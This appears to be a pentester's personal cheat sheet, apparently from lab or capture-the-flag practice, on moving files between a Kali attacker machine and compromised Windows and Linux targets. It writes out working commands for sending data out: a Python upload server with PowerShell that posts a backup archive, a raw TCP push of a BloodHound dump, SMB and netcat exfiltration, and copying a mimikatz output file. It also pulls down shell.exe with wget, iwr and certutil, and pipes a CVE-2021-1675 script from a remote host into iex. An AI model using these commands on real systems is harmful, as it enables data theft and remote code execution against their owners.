## from windows back to my kali linux
#### Upload Server
on kali, create file named upload_server.py containing:
```python
# save as upload_server.py and run: python3 upload_server.py
import http.server
import socketserver

PORT = 8000

class FileUploadHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        filename = self.headers.get('X-Filename', 'uploaded.zip')
        with open(filename, 'wb') as f:
            f.write(data)
        self.send_response(200)
        self.end_headers()

with socketserver.TCPServer(("", PORT), FileUploadHandler) as httpd:
    print(f"Serving upload handler on port {PORT}")
    httpd.serve_forever()
```
run it:
```bash
python3 upload_server.py
```
from the windows target, paste:
```powershell
$File = "C:\Users\f.frizzle\Desktop\wapt-backup-sunday.7z"
$Bytes = [System.IO.File]::ReadAllBytes($File)
$Client = New-Object Net.WebClient
$Client.Headers.Add("X-Filename", "wapt-backup-sunday.7z")
$Client.UploadData("http://10.10.14.207:8000", "POST", $Bytes)
```

#### TCP “push” with Netcat + PowerShell
on kali:
```bash
ncat -lvp 9001 > BloodHound.zip
```
on windows target in powershell:
```powershell
# Adjust path/filename as needed
$zip = "C:\Users\f.frizzle\20250419221420_BloodHound.zip"

# Open a TCP connection back to your Kali and shove the bytes across
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.207", 9001)
$stream = $client.GetStream()
$bytes  = [IO.File]::ReadAllBytes($zip)
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$client.Close()
```
- As soon as that PowerShell finishes, your Kali `ncat` will exit and `BloodHound.zip` will be complete

#### Mapping SMB Share
on kali run
```bash
smbserver.py smb share/ -smb2support
```
on windows, run:
```powershell
net use \\10.21.90.250\smb
```
then copy the file
```powershell
copy .\mimi_allyouneed101.txt \\192.168.49.109\smb\mimi_allyouneed101.txt
```


#### LOL
If target has SMB share has read,write can copy file on machine to that location, and download it with `smbclient` or `smbclient.py`

---
## From kali to windows
start python server in directory with file to upload:
```bash
python -m http.server 80
```
#### wget
```powershell
wget http://10.10.14.169/shell.exe -o s.exe
```
#### iwr
```powershell
iwr -uri http://10.10.14.169/shell.exe -OutFile s.exe
```
#### certutil
```powershell
certutil -split -urlcache -f http://192.168.49.109/chkaccess.exe C:\\Users\\rudi.davis\\Desktop\\chkaccess.exe
```

if wget doesn't work because IE engine isn't available, use `curl` with parameter:
```powershell
curl 10.10.14.6/CVE-2021-1675.ps1 -UseBasicParsing | iex
```
- `-UseBasicParsing` allows the file to come back without IE
- `iex` imports (or runs) the script 
	- useful if can't import/run a script when transferred via other means because of execution policy and `powershell -ep bypass` doesn't work

---

### NC from linux target to host
```bash
nc -lnvp 443 > 16162020_backup.zip
```
- run on kali
```bash
md5sum 16162020_backup.zip
```
- checksum on remote machine before transferring
```bash
cat 16162020_backup.zip | nc 10.10.14.191 443
```
- on remote machine to initiate the transfer
```bash
md5sum 16162020_backup.zip
```
- checksum on kali to make sure matches